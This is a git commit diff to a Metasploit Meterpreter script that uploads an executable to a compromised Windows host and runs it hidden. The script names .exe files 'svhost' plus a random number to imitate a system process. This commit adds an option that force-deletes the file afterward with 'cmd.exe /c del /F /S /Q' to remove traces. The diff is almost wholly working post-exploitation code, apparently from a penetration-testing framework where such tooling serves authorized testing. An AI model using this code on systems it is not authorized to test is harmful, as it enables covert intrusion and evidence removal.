b2da01a91a750b090e45e07b4e856e225165a667
Carlos Perez <carlos_perez@darkoperator.com>
2009-07-24 23:41:07 +0000

    Cleanned up a bit the code and added delete option after upload
    git-svn-id: file:///home/svn/framework3/trunk@6892 4d416f70-5f16-0410-b530-b9f4589650da

--- scripts/meterpreter/uploadexec.rb
+++ scripts/meterpreter/uploadexec.rb
@@ -4,8 +4,8 @@ session = client
 	"-e" => [ true, "Executable or script to upload to target host."],
 	"-o" => [ true,"Options for executable."],
 	"-p" => [ false,"Path on target where to upload executable if none given %TEMP% directory will be used."],
-        "-v" => [ false,"Verbose, return output of execution of uploaded executable."]
-
+        "-v" => [ false,"Verbose, return output of execution of uploaded executable."],
+        "-r" => [ false,"Remove executable after running by deleting it of the file system."]
 )
 ################## function declaration Declarations ##################
 def usage()
@@ -19,29 +19,29 @@ def usage()
 	puts "\t-o <opt> \tOptions for executable"
 	puts "\t-p <opt> \tPath on target where to upload executable if none given %TEMP% directory will be used"
         puts "\t-v       \tVerbose, return output of execution of uploaded executable."
+        puts "\t-r       \tRemove executable after running by deleting it of the file system."
 
 end
 def upload(session,file,trgloc = "")
         if not ::File.exists?(file)
                 raise "File to Upload does not exists!"
         else
-                if trgloc == nil
+                if trgloc == ""
                 location = session.fs.file.expand_path("%TEMP%")
                 else
                         location = trgloc
                 end
                 begin
-			ext = ""
 			ext = file.scan(/\S*(.exe)/i)
-            		if ext == ".exe"
+            		if ext.join == ".exe"
                                 fileontrgt = "#{location}\\svhost#{rand(100)}.exe"
                         else
                                 fileontrgt = "#{location}\\TMP#{rand(100)}#{ext}"
                         end
-                        print_status("Uploading #{file}....")
+                        print_status("\tUploading #{file}....")
                         session.fs.file.upload_file("#{fileontrgt}","#{file}")
-                        print_status("#{file} uploaded!")
-                        print_status("#{fileontrgt}")
+                        print_status("\t#{file} uploaded!")
+                        print_status("\tUploaded as #{fileontrgt}")
                 rescue ::Exception => e
                         print_status("Error uploading file #{file}: #{e.class} #{e}")
                 end
@@ -54,7 +54,7 @@ def cmd_exec(session,cmdexe,opt,verbose)
 	session.response_timeout=120
 	if verbose == 1
 		begin
-			print_status "Running command #{cmdexe}"
+			print_status "\tRunning command #{cmdexe}"
 			r = session.sys.process.execute(cmdexe, opt, {'Hidden' => true, 'Channelized' => true})
 			while(d = r.channel.read)
 
@@ -75,12 +75,20 @@ def cmd_exec(session,cmdexe,opt,verbose)
                 end
 	end
 end
+def m_unlink(session, path)
+	r = session.sys.process.execute("cmd.exe /c del /F /S /Q " + path, nil, {'Hidden' => 'true'})
+	while(r.name)
+		select(nil, nil, nil, 0.10)
+	end
+	r.close
+end
 #parsing of Options
 file = ""
 cmdopt = ""
 helpcall = 0
 path = ""
-verbose = 0 
+verbose = 0
+remove = 0
 @@exec_opts.parse(args) { |opt, idx, val|
 	case opt
 
@@ -94,12 +102,20 @@ verbose = 0
                 verbose = 1
 	when "-h"
 		helpcall = 1
+        when "-r"
+		remove = 1
 	end
 
 }
 if args.length != 0 or helpcall != 0
+        print_status("Running Upload and Execute Meterpreter script....")
 	exec = upload(session,file,path)
-	cmd_exec(session,exec,cmdopt,verbose)	
+	cmd_exec(session,exec,cmdopt,verbose)
+        if remove == 1
+                print_status("\tDeleting #{exec}")
+                m_unlink(session, exec)
+        end
+        print_status("Finnished!")
 else
 	usage()
 end
